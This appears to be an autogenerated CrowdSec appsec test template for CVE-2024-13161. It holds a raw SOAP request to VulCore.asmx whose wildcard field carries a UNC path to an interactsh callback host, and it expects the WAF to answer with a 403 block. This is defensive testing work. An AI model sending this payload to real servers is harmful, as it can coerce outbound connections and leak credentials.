.appsec-tests/CVE-2024-13161/CVE-2024-13161.yaml

## autogenerated on 2025-03-13 17:25:33
id: CVE-2024-13161
info:
  name: CVE-2024-13161
  author: crowdsec
  severity: info
  description: CVE-2024-13161 testing
  tags: appsec-testing
http:
  - raw:
      - |
        POST /WSVulnerabilityCore/VulCore.asmx HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Type: text/xml
        Soapaction: http://tempuri.org/GetHashForSingleFile

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
                <GetHashForSingleFile xmlns="http://tempuri.org/">
                    <wildcard>\\{{interactsh-url}}\tmp\{{file}}.txt</wildcard>
                </GetHashForSingleFile>
            </soap:Body>
        </soap:Envelope>

    cookie-reuse: true
    matchers:
    - type: status
      status:
       - 403